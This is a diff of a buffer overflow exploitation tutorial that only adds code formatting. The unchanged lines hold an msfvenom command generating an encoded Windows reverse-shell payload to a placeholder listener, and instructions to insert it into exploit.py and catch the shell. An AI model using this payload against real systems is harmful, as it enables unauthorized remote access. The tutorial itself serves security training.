@@ -50,6 +50,6 @@ After finding the EBP adress we need to convert this adress to littl-endian form
 We can now generator our payload to run against our victim machine inserting the badchars we found using mona.
 `msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a"`
 
-The EXITFUNC=thread prevents the shellcode from crashing the application when executing our shellcode.
+The `EXITFUNC=thread` prevents the shellcode from crashing the application when executing our shellcode.
 
-Now just insert the out in the exploit.py script and run it against the application to get a reverse shell. Dont forget to open a listener!
+Now just insert the out in the `exploit.py` script and run it against the application to get a reverse shell. Dont forget to open a listener!
